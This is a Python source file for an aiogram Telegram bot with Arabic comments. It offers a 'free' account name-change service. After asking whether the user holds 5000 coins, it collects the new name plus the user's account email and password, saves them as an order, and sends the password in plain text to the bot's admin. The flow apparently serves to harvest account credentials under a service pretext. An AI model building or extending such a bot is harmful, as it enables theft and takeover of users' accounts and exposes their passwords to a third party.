from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
import logging
from datetime import datetime
import json
from bot.database.db import db  # تصحيح المسار
from bot.keyboards.inline import get_yes_no_keyboard, get_contact_button, get_order_admin_keyboard, get_back_keyboard
from bot.keyboards.reply import get_main_keyboard
from bot.states.order_states import ChangeNameStates, ChangePhotoStates
from bot.config import ADMIN_ID, TIMEZONE
from bot.utils.helpers import sanitize_input, is_rate_limited

# إعداد logging
logger = logging.getLogger(__name__)

router = Router()
temp_data = {}


def safe_get_text(lang: str, key: str, default_ar: str = "", default_en: str = "") -> str:
    """دالة آمنة للحصول على النصوص مع fallback"""
    if key == 'free_orders_title':
        return "🎁 **الطلبات المجانية**\nاختر الخدمة التي تريدها" if lang == 'ar' else "🎁 **Free Requests**\nChoose the service you want"
    elif key == 'balance_question':
        return "💰 **هل لديك 5000 كوينز في حسابك؟**" if lang == 'ar' else "💰 **Do you have 5000 coins in your account?**"
    elif key == 'send_name':
        return "📝 **أرسل الاسم الجديد:**" if lang == 'ar' else "📝 **Send your new name:**"
    elif key == 'no_balance':
        return "⚠️ **عذراً، لا يمكنك تغيير الاسم بدون رصيد كافٍ**" if lang == 'ar' else "⚠️ **Sorry, you cannot change your name without sufficient balance**"
    elif key == 'invalid_name':
        return "⚠️ **الاسم غير صالح، حاول مرة أخرى**" if lang == 'ar' else "⚠️ **Invalid name, try again**"
    elif key == 'ask_email':
        return "📧 **أرسل بريدك الإلكتروني:**" if lang == 'ar' else "📧 **Send your email:**"
    elif key == 'invalid_email':
        return "⚠️ **البريد الإلكتروني غير صالح، حاول مرة أخرى**" if lang == 'ar' else "⚠️ **Invalid email, try again**"
    elif key == 'ask_password':
        return "🔑 **أرسل كلمة المرور:**" if lang == 'ar' else "🔑 **Send your password:**"
    elif key == 'invalid_password':
        return "⚠️ **كلمة المرور غير صالحة، حاول مرة أخرى**" if lang == 'ar' else "⚠️ **Invalid password, try again**"
    elif key == 'processing':
        return "⏳ **جاري معالجة طلبك...**" if lang == 'ar' else "⏳ **Processing your request...**"
    elif key == 'error':
        return "❌ **حدث خطأ، حاول مرة أخرى**" if lang == 'ar' else "❌ **An error occurred, try again**"
    elif key == 'banned':
        return "🚫 **تم حظرك من البوت**" if lang == 'ar' else "🚫 **You are banned**"
    elif key == 'rate_limited':
        return "⚠️ **عدد كبير من الطلبات، انتظر قليلاً**" if lang == 'ar' else "⚠️ **Too many requests, wait a moment**"
    
    # Fallback للنصوص الافتراضية
    return default_ar if lang == 'ar' else default_en


# ========== القائمة الرئيسية للطلبات المجانية ==========
@router.message(F.text.in_({'🎁 الطلبات المجانية', '🎁 Free Requests'}))
async def show_free_orders(message: Message):
    """عرض قائمة الطلبات المجانية"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)
    
    # التحقق من الحظر
    if db.is_user_banned(user_id):
        await message.answer(safe_get_text(lang, 'banned'), parse_mode='Markdown')
        return
    
    # استيراد الـ keyboard المناسب
    from bot.keyboards.inline import get_free_orders_keyboard
    
    title = safe_get_text(lang, 'free_orders_title')
    
    await message.answer(
        title,
        reply_markup=get_free_orders_keyboard(lang),
        parse_mode='Markdown'
    )


# ========== بدء عملية تغيير الاسم ==========
@router.callback_query(F.data == "change_name")
async def change_name_start(callback: CallbackQuery, state: FSMContext):
    """بداية عملية تغيير الاسم - سؤال عن الـ 5000 كوينز"""
    user_id = callback.from_user.id
    lang = db.get_user_language(user_id)
    
    # التحقق من الحظر
    if db.is_user_banned(user_id):
        await callback.answer(safe_get_text(lang, 'banned'), show_alert=True)
        return
    
    # التحقق من معدل الطلبات
    try:
        if is_rate_limited(user_id, 'change_name', limit=3, window=300):
            await callback.answer(safe_get_text(lang, 'rate_limited'), show_alert=True)
            return
    except Exception as e:
        logger.error(f"Rate limit error for user {user_id}: {e}")
    
    await callback.message.edit_text(
        safe_get_text(lang, 'balance_question'),
        reply_markup=get_yes_no_keyboard(),
        parse_mode='Markdown'
    )
    await state.set_state(ChangeNameStates.CHECK_BALANCE)
    await callback.answer()


@router.callback_query(F.data == "yes", ChangeNameStates.CHECK_BALANCE)
async def change_name_balance_yes(callback: CallbackQuery, state: FSMContext):
    """المستخدم لديه 5000 كوينز - طلب الاسم الجديد"""
    user_id = callback.from_user.id
    lang = db.get_user_language(user_id)
    
    await callback.message.edit_text(
        safe_get_text(lang, 'send_name'),
        parse_mode='Markdown'
    )
    await state.set_state(ChangeNameStates.WAITING_NAME)
    await callback.answer()


@router.callback_query(F.data == "no", ChangeNameStates.CHECK_BALANCE)
async def change_name_balance_no(callback: CallbackQuery, state: FSMContext):
    """المستخدم لا يملك 5000 كوينز"""
    user_id = callback.from_user.id
    lang = db.get_user_language(user_id)
    
    await state.clear()
    
    await callback.message.edit_text(
        safe_get_text(lang, 'no_balance'),
        reply_markup=get_back_keyboard(lang),
        parse_mode='Markdown'
    )
    await callback.answer()


@router.message(ChangeNameStates.WAITING_NAME)
async def change_name_get_name(message: Message, state: FSMContext):
    """استقبال الاسم الجديد"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)
    
    # التحقق من وجود نص
    if not message.text:
        await message.answer(safe_get_text(lang, 'invalid_name'), parse_mode='Markdown')
        return
    
    new_name = sanitize_input(message.text, max_length=50)
    if not new_name:
        await message.answer(safe_get_text(lang, 'invalid_name'), parse_mode='Markdown')
        return
    
    await state.update_data(new_name=new_name)
    await message.answer(safe_get_text(lang, 'ask_email'), parse_mode='Markdown')
    await state.set_state(ChangeNameStates.WAITING_EMAIL)


@router.message(ChangeNameStates.WAITING_EMAIL)
async def change_name_get_email(message: Message, state: FSMContext):
    """استقبال البريد الإلكتروني"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)
    
    # التحقق من وجود نص
    if not message.text:
        await message.answer(safe_get_text(lang, 'invalid_email'), parse_mode='Markdown')
        return
    
    email = sanitize_input(message.text, max_length=100)
    
    # التحقق البسيط من صحة البريد الإلكتروني
    if '@' not in email or '.' not in email:
        await message.answer(safe_get_text(lang, 'invalid_email'), parse_mode='Markdown')
        return
    
    await state.update_data(email=email)
    await message.answer(safe_get_text(lang, 'ask_password'), parse_mode='Markdown')
    await state.set_state(ChangeNameStates.WAITING_PASSWORD)


@router.message(ChangeNameStates.WAITING_PASSWORD)
async def change_name_get_password(message: Message, state: FSMContext):
    """استقبال كلمة المرور وإنشاء الطلب"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)
    
    # التحقق من وجود نص
    if not message.text:
        await message.answer(safe_get_text(lang, 'invalid_password'), parse_mode='Markdown')
        return
    
    password = sanitize_input(message.text, max_length=100)
    if not password:
        await message.answer(safe_get_text(lang, 'invalid_password'), parse_mode='Markdown')
        return
    
    # الحصول على البيانات من FSM
    data = await state.get_data()
    new_name = data.get('new_name')
    email = data.get('email')
    
    if not new_name or not email:
        await message.answer(safe_get_text(lang, 'error'), reply_markup=get_main_keyboard(lang), parse_mode='Markdown')
        await state.clear()
        return
    
    # إنشاء الطلب
    order_data = json.dumps({
        'type': 'change_name',
        'new_name': new_name,
        'email': email,
        'password': password
    }, ensure_ascii=False)
    
    order_number = db.create_order(user_id, 'تغيير الاسم', order_data)
    
    if not order_number:
        await message.answer(safe_get_text(lang, 'error'), reply_markup=get_main_keyboard(lang), parse_mode='Markdown')
        await state.clear()
        return
    
    # إرسال تأكيد للمستخدم
    await message.answer(safe_get_text(lang, 'processing'), reply_markup=get_main_keyboard(lang), parse_mode='Markdown')
    
    # إرسال الطلب للأدمن
    user_info = db.get_user_info(user_id)
    now = datetime.now(TIMEZONE)
    
    user_name = user_info.get('name', 'غير معروف') if user_info else 'غير معروف'
    user_username = user_info.get('username', 'لا يوجد') if user_info else 'لا يوجد'
    user_country = user_info.get('country', 'غير معروف') if user_info else 'غير معروف'
    
    admin_msg = (
        f"📦 **طلب تغيير اسم جديد**\n\n"
        f"📌 **رقم الطلب:** `{order_number}`\n"
        f"👤 **الاسم:** {user_name}\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"📝 **Username:** @{user_username}\n"
        f"🗣️ **اللغة:** {lang}\n"
        f"🌍 **الدولة:** {user_country}\n"
        f"📛 **الاسم الجديد:** {new_name}\n"
        f"📧 **البريد:** {email}\n"
        f"🔑 **كلمة المرور:** {password}\n"
        f"📅 **التاريخ:** {now.strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    from bot.keyboards.inline import get_order_admin_keyboard
    try:
        await message.bot.send_message(
            ADMIN_ID,
            admin_msg,
            reply_markup=get_order_admin_keyboard(order_number, user_id),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send admin notification for order {order_number}: {e}")
    
    # مسح الحالة
    await state.clear()
    
    # حذف البيانات المؤقتة
    if user_id in temp_data:
        del temp_data[user_id]
    
    logger.info(f"User {user_id} created change_name order {order_number}")


# ========== زر الرجوع ==========
@router.callback_query(F.data == "back_to_free_orders")
async def back_to_free_orders(callback: CallbackQuery):
    """العودة إلى قائمة الطلبات المجانية"""
    user_id = callback.from_user.id
    lang = db.get_user_language(user_id)
    
    from bot.keyboards.inline import get_free_orders_keyboard
    
    title = safe_get_text(lang, 'free_orders_title')
    
    try:
        await callback.message.edit_text(
            title,
            reply_markup=get_free_orders_keyboard(lang),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in back_to_free_orders for user {user_id}: {e}")
        await callback.message.answer(
            title,
            reply_markup=get_free_orders_keyboard(lang),
            parse_mode='Markdown'
        )
    
    await callback.answer()


def register_orders_handlers(dp):
    """تسجيل معالجات الطلبات"""
    dp.include_router(router)
    logger.info("تم تسجيل معالجات الطلبات بنجاح")
